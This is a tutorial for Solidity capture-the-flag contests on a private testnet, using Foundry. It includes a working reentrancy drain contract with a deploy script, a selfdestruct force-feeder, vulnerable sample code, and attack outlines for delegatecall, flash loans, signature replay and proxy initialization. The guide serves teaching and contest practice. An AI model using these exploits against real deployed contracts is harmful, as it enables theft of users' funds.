# Solidity CTF Guide — From Zero to Exploiting

## What is a Solidity CTF?

You get ~5-15 challenges. Each challenge is a smart contract deployed on a private testnet (a local blockchain running at the venue). Each challenge has a **win condition** — usually an `isSolved()` function that must return `true`.

The CTF organizers give you:
- An **RPC URL** (the address of the blockchain, like `http://10.0.0.1:8545`)
- A **private key** (your wallet, pre-funded with test ETH)
- The **source code** of each challenge contract
- The **deployed address** of each challenge contract

Your job: read the code, find the vulnerability, exploit it on-chain.

**Time pressure:** You typically have a few hours. First blood (solving first) often gets bonus points.

---

## What is Foundry?

Foundry is a toolkit for Solidity development. It has 3 main command-line tools:

### 1. `forge` — the compiler + test runner

Think of it like a build tool. It compiles your `.sol` files and runs tests.

```bash
forge build          # compiles all .sol files in src/
forge test           # runs all test files in test/
forge test -vvvv     # runs tests with FULL trace (shows every internal call, very useful for debugging)
```

### 2. `cast` — a command-line wallet / blockchain reader

This is your Swiss Army knife to **talk to the blockchain from the terminal**. No Solidity file needed — you just type commands.

#### Reading data (free, no gas cost):

```bash
# Call a public function (read-only)
cast call 0xTargetAddress "balanceOf(address)(uint256)" 0xYourAddress --rpc-url http://ctf-chain:8545

# The format is: "functionName(inputTypes)(outputTypes)"
# Examples:
#   "name()(string)"                     — no inputs, returns a string
#   "balanceOf(address)(uint256)"        — takes an address, returns a number
#   "isSolved()(bool)"                   — no inputs, returns true/false

# Check ETH balance of any address
cast balance 0xTargetAddress --rpc-url http://ctf-chain:8545

# Read a storage slot (NOTHING is private on-chain, you can read any variable)
cast storage 0xTargetAddress 0 --rpc-url http://ctf-chain:8545
cast storage 0xTargetAddress 1 --rpc-url http://ctf-chain:8545
# Slot 0 = first variable, slot 1 = second variable, etc.
```

#### Writing / sending transactions (costs gas):

```bash
# Call a function that modifies state
cast send 0xTargetAddress "withdraw(uint256)" 100 --rpc-url http://ctf-chain:8545 --private-key 0xYourKey

# Send ETH to an address
cast send 0xTargetAddress --value 1ether --rpc-url http://ctf-chain:8545 --private-key 0xYourKey

# Send with both a function call AND ETH value
cast send 0xTargetAddress "deposit()" --value 1ether --rpc-url http://ctf-chain:8545 --private-key 0xYourKey
```

#### Other useful cast commands:

```bash
# Compute keccak256 hash
cast keccak "some string"

# Encode function call data
cast calldata "foo(uint256)" 42

# Decode raw data
cast abi-decode "foo()(uint256,address)" 0x00000...

# Decode a function selector (4 bytes)
cast 4byte-decode 0xa9059cbb

# Compute storage slot for a mapping: keccak256(abi.encode(key, slot))
cast index address 0xSomeAddress 2    # mapping at slot 2, key is an address
cast index uint256 42 5               # mapping at slot 5, key is 42

# Get deployed bytecode of a contract
cast code 0xTargetAddress --rpc-url http://ctf-chain:8545
```

#### When to use `cast` vs an attack contract:

- **Simple challenges** (call a function, send ETH, read a secret) → `cast` is instant, no deploy needed
- **Complex challenges** (reentrancy, flash loans, multi-step in one tx) → you need an attack contract

### 3. `forge script` — deploy contracts on-chain

When you need an attack contract, you write a Solidity script file and `forge script` deploys it:

```bash
forge script script/Attack.s.sol --rpc-url http://ctf-chain:8545 --broadcast --private-key 0xYourKey
```

- `--broadcast` means "actually send the transactions to the real chain". Without it, it's a simulation / dry run.
- The script file is a special Solidity contract that uses `vm.startBroadcast()` to mark which transactions should be sent.

---

## What Does `--fork-url` Do?

This is a crucial concept for testing your exploits safely.

**Without `--fork-url`:** Your test runs on a blank local chain. There are no contracts, no balances — you'd have to deploy everything yourself in the test setup.

**With `--fork-url`:** Foundry **copies the entire state** of the CTF chain into your local test environment. Every contract, every balance, every storage slot — all there. So you can test your attack against the REAL challenge contract without actually submitting yet.

```bash
# This runs your test against a LOCAL COPY of the CTF chain
forge test -vvvv --fork-url http://ctf-chain:8545
```

**Why this matters:**
- If your test passes with `--fork-url` → you know it will work when you broadcast for real
- You don't waste gas on failed attempts
- You can iterate fast: change code → test → change code → test
- The `-vvvv` flag shows you every single internal call, so you can debug exactly what went wrong

---

## The Full Workflow, Step by Step

### At the Start of the CTF (Once)

**Step 1 — Set your credentials:**

The organizers give you an RPC URL and a private key. Save them:

```bash
cp .env.example .env
```

Edit `.env` with the values they gave you:

```
CTF_RPC_URL=http://10.0.0.1:8545
PRIVATE_KEY=0xabc123...your_key...
PLAYER_ADDRESS=0xdef456...your_address...
```

Load them into your terminal:

```bash
source .env
```

Now you can use `$CTF_RPC_URL`, `$PRIVATE_KEY`, etc. in all your commands.

---

### For Each Challenge

Let's walk through a concrete example. Say the CTF gives you:

> **Challenge 1 — "Piggy Bank"**
> - Contract at: `0xABC123...`
> - Source code: (they show you the Solidity)
> - Win condition: drain all ETH from the contract

#### Step 1 — Recon with `cast`

Before writing any code, gather information:

```bash
# How much ETH does the challenge contract hold?
cast balance 0xABC123 --rpc-url $CTF_RPC_URL

# Read its storage slots (maybe there's a "secret" password stored on-chain)
cast storage 0xABC123 0 --rpc-url $CTF_RPC_URL
cast storage 0xABC123 1 --rpc-url $CTF_RPC_URL
cast storage 0xABC123 2 --rpc-url $CTF_RPC_URL

# Is it already solved?
cast call 0xABC123 "isSolved()(bool)" --rpc-url $CTF_RPC_URL

# What's the owner?
cast call 0xABC123 "owner()(address)" --rpc-url $CTF_RPC_URL
```

#### Step 2 — Read the Source Code and Find the Vulnerability

Read the challenge's Solidity code carefully. Look for common patterns (see vulnerability list below).

#### Step 3 — Can You Solve It with Just `cast`?

If the exploit is simple (e.g., just call a function, or the "password" is readable from storage):

```bash
# Example: the contract has a withdraw() that anyone can call
cast send 0xABC123 "withdraw()" --rpc-url $CTF_RPC_URL --private-key $PRIVATE_KEY

# Example: need to pass a "secret" password that's stored in slot 0
# First read the secret:
cast storage 0xABC123 0 --rpc-url $CTF_RPC_URL
# Returns: 0x00000000000000000000000000000000000000000000000000000000000007d0
# That's 2000 in decimal
# Now call with the password:
cast send 0xABC123 "unlock(uint256)" 2000 --rpc-url $CTF_RPC_URL --private-key $PRIVATE_KEY
```

Check if solved:
```bash
cast call 0xABC123 "isSolved()(bool)" --rpc-url $CTF_RPC_URL
# Should return: true
```

Done! Move to next challenge.

#### Step 4 — If You Need an Attack Contract

For complex attacks that require multiple actions in a single transaction (reentrancy, flash loans, etc.):

**4a. Copy the templates:**
```bash
cp src/AttackTemplate.sol src/PiggyBankAttack.sol
cp script/Attack.s.sol script/PiggyBank.s.sol
cp test/AttackTest.t.sol test/PiggyBank.t.sol
```

**4b. Paste the challenge contract or create an interface in `src/`:**

You don't always need the full contract — an interface with just the functions you need is enough:

```solidity
// src/IPiggyBank.sol
interface IPiggyBank {
    function deposit() external payable;
    function withdraw() external;
    function isSolved() external view returns (bool);
}
```

**4c. Write your attack contract in `src/PiggyBankAttack.sol`:**

```solidity
contract PiggyBankAttack {
    IPiggyBank public target;
    address public owner;

    constructor(address _target) {
        target = IPiggyBank(_target);
        owner = msg.sender;
    }

    function exploit() external payable {
        // Deposit first to become eligible for withdrawal
        target.deposit{value: 1 ether}();
        // Then withdraw — this triggers reentrancy via receive()
        target.withdraw();
    }

    // This is called when the target sends us ETH
    receive() external payable {
        // Keep re-entering until the target is drained
        if (address(target).balance > 0) {
            target.withdraw();
        }
    }

    // Get the stolen ETH out
    function collect() external {
        payable(owner).transfer(address(this).balance);
    }
}
```

**4d. Write the deploy script in `script/PiggyBank.s.sol`:**

```solidity
import "forge-std/Script.sol";
import "../src/PiggyBankAttack.sol";

contract PiggyBankScript is Script {
    function run() external {
        vm.startBroadcast();

        // Deploy the attack contract, pointing it at the challenge
        PiggyBankAttack attack = new PiggyBankAttack(0xABC123);

        // Execute the exploit with 1 ETH
        attack.exploit{value: 1 ether}();

        // Collect stolen funds
        attack.collect();

        vm.stopBroadcast();
    }
}
```

**4e. Test it locally against the real chain state (safe, no gas spent):**

```bash
forge test -vvvv --fork-url $CTF_RPC_URL --match-test test_exploit
```

If the test passes → your exploit works.
If it fails → the `-vvvv` trace will show you exactly which call reverted and why.

**4f. Deploy for real:**

```bash
forge script script/PiggyBank.s.sol --rpc-url $CTF_RPC_URL --broadcast --private-key $PRIVATE_KEY
```

**4g. Verify:**

```bash
cast call 0xABC123 "isSolved()(bool)" --rpc-url $CTF_RPC_URL
# Should return: true
```

---

## Gas Optimization for Attack Contracts

Sometimes the CTF chain has low block gas limits, or you want to deploy as fast as possible.

**Use the `ctf` profile** (already configured in `foundry.toml`):

```bash
# Compile with smallest possible bytecode
FOUNDRY_PROFILE=ctf forge build

# Deploy with smallest possible bytecode
FOUNDRY_PROFILE=ctf forge script script/PiggyBank.s.sol --rpc-url $CTF_RPC_URL --broadcast --private-key $PRIVATE_KEY
```

What this does:
- `optimizer_runs = 1` → tells the compiler to optimize for **deploy cost** (smaller bytecode), not runtime cost
- `via_ir = true` → uses an alternate compiler pipeline that can produce even smaller bytecode

**Other tips:**
- Keep attack contracts minimal — don't add unnecessary functions
- Move setup logic into `exploit()` instead of the constructor
- If your contract is too big to deploy, split it into two smaller contracts

---

## Common Vulnerability Patterns

### 1. Reentrancy
**What:** The contract sends ETH (or calls an external contract) BEFORE updating its own state.
**How to spot:** Look for `.call{value:}()`, `.transfer()`, or `.send()` that happen BEFORE a balance/state update.
**Attack:** Your `receive()` or `fallback()` function re-calls the vulnerable function before the state is updated.

```solidity
// VULNERABLE CODE:
function withdraw() external {
    uint256 amount = balances[msg.sender];
    (bool success,) = msg.sender.call{value: amount}(""); // sends ETH first!
    balances[msg.sender] = 0; // updates state AFTER — too late!
}
```

### 2. Access Control
**What:** Missing `onlyOwner` checks, wrong visibility, `tx.origin` instead of `msg.sender`.
**How to spot:** Functions that should be restricted but aren't. `tx.origin` checks (can be bypassed by calling from a contract).
**Attack:** Just call the unprotected function directly.

### 3. Reading "Private" Variables
**What:** Variables marked `private` are NOT actually secret — they're just not accessible from other contracts. Anyone can read them from storage.
**How to spot:** Passwords, secrets, or answers stored as `private` variables.
**Attack:**
```bash
cast storage 0xContractAddress 0 --rpc-url $CTF_RPC_URL  # slot 0 = first variable
```

### 4. Integer Overflow/Underflow
**What:** In Solidity < 0.8.0, math operations can silently overflow. In >= 0.8.0, look for `unchecked {}` blocks.
**How to spot:** Old compiler version without SafeMath. Or `unchecked` blocks doing arithmetic.
**Attack:** Make a number wrap around (e.g., `0 - 1 = 2^256 - 1`).

### 5. Delegatecall Exploits
**What:** `delegatecall` runs another contract's code in YOUR storage context. If the storage layouts don't match, chaos ensues.
**How to spot:** Proxy patterns, `delegatecall` to user-controlled addresses.
**Attack:** Make the contract delegatecall to your malicious contract, which overwrites critical storage slots (like the owner).

### 6. Self-destruct / Force-sending ETH
**What:** `selfdestruct(payable(target))` sends ETH to any address, bypassing `receive()` and `fallback()`.
**How to spot:** Contracts that rely on `address(this).balance` for logic.
**Attack:**
```solidity
contract ForceFeeder {
    constructor(address target) payable {
        selfdestruct(payable(target));
    }
}
```

### 7. Flash Loan / Price Manipulation
**What:** Borrow a huge amount, manipulate a price oracle, profit, repay — all in one transaction.
**How to spot:** Price oracles based on DEX reserves (spot price), single-source oracles.
**Attack:** Flash borrow → swap to manipulate price → exploit the manipulated price → swap back → repay.

### 8. Signature Replay
**What:** A valid signature can be reused if there's no nonce, chain ID, or contract address check.
**How to spot:** `ecrecover` usage without nonce tracking. Note: `ecrecover` returns `address(0)` on invalid signatures (not a revert!).
**Attack:** Capture a valid signature and reuse it, or use an invalid signature if `address(0)` is not checked.

### 9. Weak Randomness
**What:** `block.timestamp`, `block.prevrandao`, `blockhash` are all predictable or manipulable.
**How to spot:** Any "randomness" derived from block properties.
**Attack:** Pre-compute the "random" value from a contract (you see the same block properties).

### 10. ERC20 Quirks
**What:** Some tokens don't follow the standard exactly.
**How to spot:** Missing return values (USDT-style), fee-on-transfer, rebasing tokens, approval race conditions.
**Attack:** Depends on the specific quirk.

### 11. Uninitialized Proxy / Storage Collision
**What:** Implementation contracts that aren't initialized, or proxy/implementation storage slots that overlap.
**How to spot:** `initialize()` functions that can be called by anyone, proxy patterns with wrong storage slots.
**Attack:** Call `initialize()` on the implementation contract directly to become owner.

---

## Quick Reference Table

| Tool | What it does | When to use |
|------|-------------|-------------|
| `cast call` | Read blockchain data (free) | Recon, check balances, read storage, check `isSolved()` |
| `cast send` | Send a transaction (costs gas) | Simple exploits — one function call |
| `cast storage` | Read raw storage slot | Read "private" variables |
| `forge build` | Compile your Solidity files | After writing/changing code |
| `forge test -vvvv` | Run tests locally | Validate exploit before deploying |
| `forge test --fork-url` | Run tests against a copy of the real chain | Validate exploit against actual challenge |
| `forge script --broadcast` | Deploy contracts on-chain | Complex exploits needing an attack contract |
| `FOUNDRY_PROFILE=ctf` | Use gas-optimized compilation | Smaller bytecode, cheaper deploys |
